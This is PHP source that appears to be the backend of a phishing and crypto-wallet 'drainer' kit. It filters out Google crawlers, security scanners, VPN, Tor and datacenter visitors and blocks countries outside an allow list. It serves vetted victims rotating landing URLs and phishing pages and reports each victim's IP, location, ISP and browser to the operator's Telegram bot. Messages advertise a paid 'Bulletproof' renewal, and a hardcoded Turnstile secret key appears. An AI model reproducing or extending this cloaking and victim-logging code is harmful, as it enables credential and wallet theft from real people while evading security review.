    if (stripos($isp, 'google') === false) {
        return false;
    }

    // 3) Reverse DNS + suffix check
    $host = @gethostbyaddr($ip);
    if (! $host || ! isGoogleHost($host)) {
        return false;
    }

    return false;
}
function detectMaliciousBot(string $userAgent, string $ip, ?string $isp = null): array 
{
    // Layer 1: Basic Bot Detection
    if (empty($userAgent)) {
        return ['bot' => true, 'layer' => 1, 'reason' => 'Empty User-Agent'];
    }
    if (preg_match('/(bot|crawl|spider|scrap|scan|hack|brute|sqlmap|nikto|wget|curl|python|java|perl|ruby|phantom|headless|selenium|zmeu)/i', $userAgent)) {
        return ['bot' => true, 'layer' => 1, 'reason' => 'Suspicious User-Agent pattern'];
    }

    // Layer 2: IP Reputation Check
    $ipv4 = ip2long($ip);
    if ($ipv4) {
        $badRanges = [
            [ip2long('10.0.0.0'),    ip2long('10.255.255.255')],   // Private
            [ip2long('172.16.0.0'),  ip2long('172.31.255.255')],   // Private
            [ip2long('192.168.0.0'), ip2long('192.168.255.255')],  // Private
            [ip2long('100.64.0.0'),  ip2long('100.127.255.255')],  // CGNAT
            [ip2long('141.98.0.0'),  ip2long('141.98.255.255')],   // VPN
            [ip2long('185.86.0.0'),  ip2long('185.86.255.255')],   // VPN
            [ip2long('45.133.0.0'),  ip2long('45.133.255.255')],   // VPN
            [ip2long('185.220.100.0'), ip2long('185.220.103.255')],// TOR
            [ip2long('66.102.0.0'), ip2long('66.102.255.255')],   // Google
            [ip2long('149.154.160.0'), ip2long('149.154.175.255')] // Telegram
        ];
        
        foreach ($badRanges as $i => $range) {
            if ($ipv4 >= $range[0] && $ipv4 <= $range[1]) {
                $rangeName = [
                    'Private IP', 'Private IP', 'Private IP', 'CGNAT IP',
                    'VPN Range', 'VPN Range', 'VPN Range', 'TOR Exit Node',
                    'Google Spoof Range', 'Telegram Bot Range'
                ][$i];
                return ['bot' => true, 'layer' => 2, 'reason' => $rangeName];
            }
        }
    }

    // Layer 3: ISP Analysis
    if ($isp && preg_match('/(vpn|proxy|tor|hosting|datacenter|server|cloud)/i', $isp)) {
        return ['bot' => true, 'layer' => 3, 'reason' => 'Suspicious ISP: ' . $isp];
    }

    // Layer 4: Advanced Verification
    $host = @gethostbyaddr($ip);
    if ($host && $host !== $ip) {
        if (preg_match('/(vpn|proxy|tor|exit|relay|hosting|server|datacenter)/i', $host)) {
            return ['bot' => true, 'layer' => 4, 'reason' => 'Suspicious Reverse DNS: ' . $host];
        }

        $forwardIPs = @gethostbynamel($host);
        if (!empty($forwardIPs) && !in_array($ip, $forwardIPs, true)) {
            return ['bot' => true, 'layer' => 4, 'reason' => 'DNS Mismatch: ' . $ip . ' vs ' . implode(',', $forwardIPs)];
        }
    }


    // Layer 6: Behavioral Analysis
    if (isset($_SERVER['HTTP_ACCEPT_ENCODING'])) {
        $ae = strtolower($_SERVER['HTTP_ACCEPT_ENCODING']);
        // Using strpos() instead of str_contains() for PHP < 8.0
        if (strpos($ae, 'gzip') === false && 
            strpos($ae, 'deflate') === false && 
            strpos($ae, 'br') === false) {
            return ['bot' => true, 'layer' => 6, 'reason' => 'Unusual Accept-Encoding: ' . $ae];
        }
    }

    // Layer 7: Request Pattern Analysis
    if (isset($_SERVER['REQUEST_TIME_FLOAT'])) {
        $requestSpeed = microtime(true) - $_SERVER['REQUEST_TIME_FLOAT'];
        if ($requestSpeed < 0.05) {
            return ['bot' => true, 'layer' => 7, 'reason' => 'Unnaturally fast request: ' . number_format($requestSpeed*1000, 2) . 'ms'];
        }
    }

    return ['bot' => false, 'layer' => 0, 'reason' => 'Clean request'];
}
function log_visite($ip, $login_type, $country, $isp, $project, $addby)
{
    global $fs_host, $fs_user, $fs_pass, $fs_name;

    $response = [];

    $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
    if (!$db) {
        http_response_code(500);
        return json_encode([
            "status" => "error",
            "message" => "Database connection failed",
            "error" => mysqli_connect_error()
        ]);
    }

    // Check if the visit is already recorded
    $checkQuery = "SELECT COUNT(*) as count FROM visite WHERE ip = ? AND addby = ? AND project = ?";
    $stmt = $db->prepare($checkQuery);
    if (!$stmt) {
        http_response_code(500);
        return json_encode([
            "status" => "error",
            "message" => "Failed to prepare check query",
            "error" => $db->error
        ]);
    }

    $stmt->bind_param("sss", $ip, $addby, $project);
    $stmt->execute();
    $result = $stmt->get_result();
    $row = $result->fetch_assoc();

    if ($row && $row["count"] > 0) {
        $stmt->close();
        $db->close();
        return json_encode([
            "status" => "exists",
            "message" => "Visit already logged"
        ]);
    }
    $stmt->close();

    // Insert the visit
    $insertQuery = "INSERT INTO visite (ip, country, isp, login_type, project, addby)
                    VALUES (?, ?, ?, ?, ?, ?)";
    $stmt = $db->prepare($insertQuery);
    if (!$stmt) {
        http_response_code(500);
        return json_encode([
            "status" => "error",
            "message" => "Failed to prepare insert query",
            "error" => $db->error
        ]);
    }

    $stmt->bind_param("ssssss", $ip, $country, $isp, $login_type, $project, $addby);
    if (!$stmt->execute()) {
        $stmt->close();
        $db->close();
        http_response_code(500);
        return json_encode([
            "status" => "error",
            "message" => "Failed to log visit",
            "error" => $stmt->error
        ]);
    }

    $stmt->close();
    $db->close();

    return json_encode([
        "status" => "success",
        "message" => "Visit logged successfully"
    ]);
}
function check_country(array $countryIn, string $countryOut): bool
{
    $countryOut = strtolower(trim($countryOut));
    foreach ($countryIn as $allowed) {
        if (strtolower(trim($allowed)) === $countryOut) {
            return true;
        }
    }
    return false;
}

function verifyCloudflareTurnstile($token, $remoteIp) {
    $secretKey = '0x4AAAAAABlzrTx2CwjTB5yzHo_Efh9PA48';
    $url = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';

    $data = http_build_query([
        'secret' => $secretKey,
        'response' => $token,
        'remoteip' => $remoteIp
    ]);

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    $response = curl_exec($ch);

    if ($response === false) {
        return ['success' => false, 'error' => curl_error($ch)];
    }

    $responseData = json_decode($response, true);
    curl_close($ch);

    return [
        'success' => (bool)$responseData['success'],
        'error' => $responseData['error-codes'] ?? null
    ];
}

function user_web3($ipAddress, $id)
{
    global $fs_host, $fs_user, $fs_pass, $fs_name;

    try {
        $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
        if (!$db) {
            throw new Exception("Database connection failed: " . mysqli_connect_error());
        }

        $stmt = $db->prepare("SELECT project_tel_token, project_tel_id, project_name, username, project_logo FROM drain WHERE private_key = ?");
        if (!$stmt) {
            throw new Exception("Prepare failed: " . $db->error);
        }

        $stmt->bind_param("s", $id);
        $stmt->execute();
        $result = $stmt->get_result();

        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();

            return [
                "status" => "success",
                "message" => "Drain data found.",
                "data" => [
                    "tel_token"     => $row["project_tel_token"],
                    "tel_id"        => $row["project_tel_id"],
                    "project_name"  => $row["project_name"],
                    "create_by"     => $row["username"],
                    "pro_logo"      => $row["project_logo"]
                ]
            ];
        } else {
            return [
                "status" => "error",
                "message" => "No matching record found."
            ];
        }

    } catch (Exception $e) {
        error_log("user_web3 error: " . $e->getMessage());
        return [
            "status" => "error",
            "message" => "Internal server error.",
            "error" => $e->getMessage()
        ];
    } finally {
        if (isset($stmt)) $stmt->close();
        if (isset($db)) $db->close();
    }
}

function url_web3()
{
    global $fs_host, $fs_user, $fs_pass, $fs_name;
    try {
        $db = mysqli_connect($fs_host, $fs_user, $fs_pass, $fs_name);
        if (!$db) throw new Exception("Connection failed: " . mysqli_connect_error());

        $sql = "SELECT luxurl FROM luxdataurl WHERE status = '2'";
        $result = mysqli_query($db, $sql);
        if (!$result) throw new Exception("Query failed: " . mysqli_error($db));

        $links = [];
        while ($row = mysqli_fetch_assoc($result)) {
            $links[] = $row["luxurl"];
        }

        mysqli_close($db);

        if (count($links) === 0) {
            return ["status" => "error", "message" => "No URLs available"];
        }

        shuffle($links);
        foreach ($links as $random_link) {
            $safety_result = checkUrlSafety($random_link);
            if ($safety_result === "Safe") {
                return [
                    "status" => "success",
                    "message" => "Safe URL found",
                    "url" => $random_link
                ];
            }
        }

        return ["status" => "error", "message" => "No safe URLs available"];

    } catch (Exception $e) {
        return ["status" => "error", "message" => "Internal server error", "error" => $e->getMessage()];
    }
}

function send_message($message,$token,$chatid)
{
       $api_url = "https://api.telegram.org/bot{$token}/sendMessage";
       $params = ["chat_id" => $chatid, "text" => $message];
       $ch = curl_init();
       curl_setopt($ch, CURLOPT_URL, $api_url);
       curl_setopt($ch, CURLOPT_POST, true);
       curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
       $response = curl_exec($ch);
       curl_close($ch);
}
function obfuscateString($input) {
    $length = strlen($input);
    if ($length <= 2) return $input; // return as-is if too short

    $first = $input[0];
    $last = $input[$length - 1];

    $middle = str_repeat('*', $length - 2);

    return $first . $middle . $last;
}
function safe_base64_double_decode($input) {
    if (!is_string($input)) return '';

    // First decode
    $decoded1 = base64_decode($input, true);
    if ($decoded1 === false) return '';

    // Second decode
    $decoded2 = base64_decode($decoded1, true);
    if ($decoded2 === false) return '';

    return $decoded2;
}








// Handle incoming request
$requestData = json_decode(file_get_contents('php://input'), true);

// Initialize response data
$response = [
    'status' => 'error',
    'message' => 'Invalid request',
    'agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
    'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR']
];





$type = $requestData['type'] ?? '';
$ipAddress = $requestData['ip'] ?? $_SERVER['REMOTE_ADDR'];
$userId = safe_base64_double_decode($requestData['user_id'] ?? '');
$web3   = safe_base64_double_decode($requestData['web3'] ?? '');
$reson = $requestData['reson'] ?? '';
$userAgent = $requestData['user_agent'] ?? ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown');
$client_info = detectDeviceDetails($userAgent,$ipAddress);
$userData = user_data($userId, $client_info, $ipAddress);

 
 
 
 
 
 
// Debug: JSON parse errors
if (json_last_error() !== JSON_ERROR_NONE) {
	$res = banned_client($ipAddress, 'Invalid JSON input', $client_info);
    echo json_encode(['status' => 'error', 'message' => 'Invalid JSON input', 'error' => json_last_error_msg()]);
    exit();
}

if (empty($requestData) || !isset($requestData['type'])) {
	$res = banned_client($ipAddress, 'Invalid request', $client_info);
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
    exit();
}


if (isset($requestData['cf-turnstile-response'])) {

    $token = $requestData['cf-turnstile-response'];
    $remoteIp = $_SERVER['REMOTE_ADDR'];

    $verification = verifyCloudflareTurnstile($token, $remoteIp);

    if ($verification['success']) {
        $_SESSION['captcha_verified'] = true;
        $_SESSION['captcha_verified_time'] = time();


		
    } else {
        http_response_code(400);
        echo json_encode([
            'success' => false, 
            'error' => 'CAPTCHA verification failed',
            'details' => $verification['error'] ?? 'Unknown error'
        ]);
      exit;		
    }

}

$found = check_keyword($ipAddress, $client_info['isp']);
$detector = isGoogleCrawler($userAgent, $ipAddress, $client_info['isp']);			
$newData = detectMaliciousBot($userAgent, $ipAddress, $client_info['isp']);	

			
switch (strtolower($type)) {
	
    case 'check':
        if ($userData['status'] == 'success') {
            $response = array_merge($userData, [
                'status' => 'success',
				'success'   => true,
				'message' => 'data found',
                'userid' => $userId,
                'ip'     => $ipAddress,
                'agent'  => $userAgent,
            ]);
        } else {
            $response = [
                'status'  => 'error',
				'success' => false,
                'message' => $userData['message'],
                'agent'   => $userAgent,
                'ip'      => $ipAddress,
            ];
        }
        break;
		
    case 'checkweb3':
	
	   $web3_data = user_web3($ipAddress, $web3);
       if ($web3_data['status'] == 'success') {
           $response = array_merge($web3_data, [
               'status' => 'success',
               'success' => true,
               'message' => 'web3 found',
               'web3' => $web3,
               'ip'   => $ipAddress,
               'agent' => $userAgent,
           ]);
       } else {
           $response = [
               'status'  => 'error',
               'success' => false,
               'message' => $web3_data['message'] ?? 'Unknown error',
               'agent'   => $userAgent,
               'ip'      => $ipAddress,
           ];
       }
   
        break;		
    case 'blocked':
	   
	    $res = banned_client($ipAddress, $reson, $client_info);
        $response = array_merge($client_info, [
            'status'  => 'error',
            'message' => $res['message'],
            'agent'   => $userAgent,
            'ip'      => $ipAddress,
        ]);
        break;
		
case 'web3':
    	if (detect_user($ipAddress)) 
        {
            $response = [
               'status'  => 'error',
               'message' => 'user blacklisted',
               'agent'   => $userAgent,
               'ip'      => $ipAddress,
           ];
             break;	
        }
        if ($found !== false) 
        {
            $res = banned_client($ipAddress, "Detected word: $found", $client_info);
            $response = array_merge($client_info, [
                'status'  => 'error',
                'message' => $res['message'],
                'agent'   => $userAgent,
                'ip'      => $ipAddress,
            ]);
            break;
        }
        if ($detector !== false) 
        {
            $res = banned_client($ipAddress, "Google Detected", $client_info);
            $response = array_merge($client_info, [
                'status'  => 'error',
                'message' => $res['message'],
                'agent'   => $userAgent,
                'ip'      => $ipAddress,
            ]);
            break;
        } 
        if (is_bot_ip($ipAddress))
        {
        	$res = banned_client($ipAddress, "Google IP", $client_info);
            $response = array_merge($client_info, [
                'status'  => 'error',
                'message' => $res['message'],
                'agent'   => $userAgent,
                'ip'      => $ipAddress,
            ]);
            break; 
        	 
         }
        if ($newData['bot'] === true) 
        {
            $res = banned_client($ipAddress, $newData['reason'], $client_info);
        
             $response = array_merge($client_info, [
               'status'  => 'error',
               'message' => $res['message'],
               'agent'   => $userAgent,
               'ip'      => $ipAddress,
           ]);
           break;
            
        }
        
    $success_url = url_web3();
    if ($success_url['status'] === 'success') {
        $success_url_final = $success_url['url'];
        $web3_data = user_web3($ipAddress, $web3);

        if ($web3_data['status'] === 'success') {
			    $web3_data_project = $web3_data['data']['project_name'];
				$username = $web3_data['data']['create_by'];
				$project_logo = $web3_data['data']['pro_logo'];
				$country = $client_info['country'];
                $sip_name = $client_info['isp'];
                $city = $client_info['city'];
                $mobile = $client_info['mobile'];
                $browser = $client_info['Browser'];
                $log_date = $client_info['local_time'];
			    $message = "
✅ 🅽🅴🆆 🆅🅸🆂🅸🆃🅴   (Web3)
--------------------------------------------
🏠  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$web3_data_project}
👨‍🔧  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {$username}
📡  𝗜𝗣: {$ipAddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$sip_name}
💻  𝗖𝗶𝘁𝘆: {$city}
📱  𝗠𝗼𝗯𝗶𝗹𝗲: {$mobile} 
🌐  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$browser} 
🎫  𝗗𝗮𝘁𝗲/𝘁𝗶𝗺𝗲: {$log_date}
--------------------------------------------";		
            $response = [
                'status'  => 'success',
                'message' => 'web3 created',
				'success'     => true,
                'message_url' => "$success_url_final??userid=$web3",
                'pro_logo' => $web3_data['data']['pro_logo'],
                'project' => $web3_data['data']['project_name'],
                'agent'   => $userAgent,
                'ip'      => $ipAddress,
            ];
			log_visite($ipAddress, 3, $client_info['country'], $client_info['isp'], $web3_data['data']['project_name'], $web3_data['data']['create_by']);
			send_message($message,$web3_data['data']['tel_token'],$web3_data['data']['tel_id']);
			
        } else {
			$res = banned_client($ipAddress, 'invalid web3 user', $client_info);
            $response = [
                'status' => 'error',
                'message' => 'web3 not found',
                'agent' => $userAgent,
                'ip' => $ipAddress
            ];
        }

    } else {
        $response = [
            'status' => 'error',
            'message' => 'web3 invalid url',
            'agent' => $userAgent,
            'ip' => $ipAddress
        ];
    }

    break;

    case 'login':
        $maxRetries = 5;
        $retryDelay = 2;
        $success = false;
        $attempt = 0;
		if (detect_user($ipAddress)) 
        {
            $response = [
               'status'  => 'error',
               'message' => 'user blacklisted',
               'agent'   => $userAgent,
               'ip'      => $ipAddress,
           ];
             break;	
        }
        if ($found !== false) 
        {
            $res = banned_client($ipAddress, "Detected word: $found", $client_info);
            $response = array_merge($client_info, [
                'status'  => 'error',
                'message' => $res['message'],
                'agent'   => $userAgent,
                'ip'      => $ipAddress,
            ]);
            break;
        }
        if ($detector !== false) 
        {
            $res = banned_client($ipAddress, "Google Detected", $client_info);
            $response = array_merge($client_info, [
                'status'  => 'error',
                'message' => $res['message'],
                'agent'   => $userAgent,
                'ip'      => $ipAddress,
            ]);
            break;
        } 
        if (is_bot_ip($ipAddress))
        {
        	$res = banned_client($ipAddress, "Google IP", $client_info);
            $response = array_merge($client_info, [
                'status'  => 'error',
                'message' => $res['message'],
                'agent'   => $userAgent,
                'ip'      => $ipAddress,
            ]);
            break; 
        	 
         }
        if ($userData['proxy'] == 1)
        {
        	 if ($client_info['proxy'] == 'True'){
        	     $res = banned_client($ipAddress, "Proxy Detected", $client_info);
                 $response = array_merge($client_info, [
                     'status'  => 'error',
                     'message' => $res['message'],
                     'agent'   => $userAgent,
                     'ip'      => $ipAddress,
                 ]);
        	 
                break; 
          }
        }
        if ($newData['bot'] === true) 
        {
            $res = banned_client($ipAddress, $newData['reason'], $client_info);
        
             $response = array_merge($client_info, [
               'status'  => 'error',
               'message' => $res['message'],
               'agent'   => $userAgent,
               'ip'      => $ipAddress,
           ]);
           break;
            
        }
        
        	
	    if (!$userData['status'] == 'success') 
        {
        	$res = banned_client($ipAddress, 'invalid id', $client_info);
            $response = array_merge($client_info, [
                'status'  => 'error',
                'message' => $res['message'],
                'agent'   => $userAgent,
                'ip'      => $ipAddress,
            ]);
           break;	
        }
        if (!check_country($userData['cn'], $client_info['countryCode'])) 
        {
        
            $res = banned_client($ipAddress, 'Invalid country', $client_info);
            $response = array_merge($client_info, [
               'status'  => 'error',
        	   'cn_out'  => $client_info['countryCode'],
               'message' => $res['message'],
               'agent'   => $userAgent,
               'ip'      => $ipAddress,
           ]);
           break;
        }	
        	
	
	
	
        while (!$success && $attempt < $maxRetries) {
            $attempt++;

            if ($userData['status'] == 'success') {
                $log_extract = url_packet();
    
                if ($log_extract) {
				$result = send_command($userAgent, $ipAddress, $log_extract, "create", $userId, $client_info['local_domain']);
                    $success = isset($result["res_status"]) && $result["res_status"] === "success";
			    
                    if ($success) {
                        $res_dir = $result["res_dir"] ?? null;
                        $res_url = $result["res_url"] ?? null;
                        $res_id  = $result["res_id"]  ?? null;
                        $res_ip  = $result["res_ip"]  ?? null;
                        $res_action = $result["res_action"] ?? null;

                        log_visite($ipAddress, 0, $client_info['country'], $client_info['isp'], $userData['project'], $userData['addby']);
                	    $expireTimestamp = strtotime($userData['expire_date']);
                	    $currentTimestamp = time();
                	    
                	    $project_name = $userData['project'];
                        $username = $userData['addby'];
                        $expire = $userData['expire_date'];
                        $country = $client_info['country'];
                        $sip_name = $client_info['isp'];
                        $city = $client_info['city'];
                        $mobile = $client_info['mobile'];
                        $browser = $client_info['Browser'];
                        $log_date = $client_info['local_time'];
                	    
                	    if ($currentTimestamp >= $expireTimestamp)
                	    {
                           $country_obf = obfuscateString($client_info['country']);
                           $sip_name_obf = obfuscateString($client_info['isp']);
                           $city_obf = obfuscateString($client_info['city']);
                           $mobile_obf = obfuscateString($client_info['mobile']);
                           $browser_obf = obfuscateString($client_info['Browser']);
                           $ipAddress_obf = obfuscateString($ipAddress);
                           $message = "
❌ 🅽🅴🆆 🆅🅸🆂🅸🆃🅴 (Expired)
Your Link is Expired Result Will be hidden
Try to Reactive your Bulletproof Now!!
https://www.zeroday.help/bulletproof/price/
--------------------------------------------
❌  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$project_name}
❌  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {$username}
❌  𝗘𝘅𝗽𝗶𝗿𝗲: {$expire}
❌  𝗜𝗣: {$ipAddress_obf}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country_obf}
🗺️  𝗦𝗜𝗣: {$sip_name_obf}
💻  𝗖𝗶𝘁𝘆: {$city_obf}
📱  𝗠𝗼𝗯𝗶𝗹𝗲: {$mobile_obf} 
🌐  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$browser_obf} 
🎫  𝗗𝗮𝘁𝗲/𝘁𝗶𝗺𝗲: {$log_date}
--------------------------------------------";
                                  
                	    }else{
                     		
                           $message = "
✅ 🅽🅴🆆 🆅🅸🆂🅸🆃🅴   
--------------------------------------------
🏠  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$project_name}
👨‍🔧  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {$username}
📡  𝗘𝘅𝗽𝗶𝗿𝗲: {$expire}
📡  𝗜𝗣: {$ipAddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$sip_name}
💻  𝗖𝗶𝘁𝘆: {$city}
📱  𝗠𝗼𝗯𝗶𝗹𝗲: {$mobile} 
🌐  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$browser} 
🎫  𝗗𝗮𝘁𝗲/𝘁𝗶𝗺𝗲: {$log_date}
--------------------------------------------";		
                     		
                     		
                     	}
                     	
                           send_message($message,$userData['tokentel'],$userData['idtel']);
                           $message_url = "$res_url/?id=$res_id&user=$res_ip&remote=$res_dir&type=login";
			    
                           $response = array_merge($userData, [
                            'status'      => 'success',
							'success'     => true,
                            'message'     => 'ready',
                            'agent'       => $userAgent,
                            'ip'          => $ipAddress,
                            'res_dir'     => $res_dir,
                            'res_url'     => $res_url,
                            'res_id'      => $res_id,
                            'res_action'  => $res_action,
                            'log_extract' => $log_extract,
                            'message_url' => $message_url,
                        ]);
                    } else {
                         $response = array_merge($result, [
                            'status'      => 'error',
                            'message'     => 'blacklisted extractor',
                            'agent'       => $userAgent,
                            'ip'          => $ipAddress,
                            'log_extract' => $log_extract,
                        ]);
                    }
                } else {
                    $response = [
                        'status'  => 'error',
                        'message' => 'Main extract domain',
                        'agent'   => $userAgent,
                        'ip'      => $ipAddress,
                    ];
                  }
    		}else{
    			$res = banned_client($ipAddress, 'invalid user', $client_info);
                $response = array_merge($client_info, [
                    'status'  => 'error',
                    'message' => $res['message'],
                    'agent'   => $userAgent,
                    'ip'      => $ipAddress,
                ]);
    			
    		}
            if (!$success) {
                sleep($retryDelay);
            }
        }
    
        break;
    
    default:
	        $res = banned_client($ipAddress, 'invalid Request', $client_info);
            $response = [
                'status' => 'error',
                'message' => 'Request processed by gserver.php',
                'original_type' => $type
            ];
            break;
}

echo json_encode($response, JSON_UNESCAPED_UNICODE);




?>
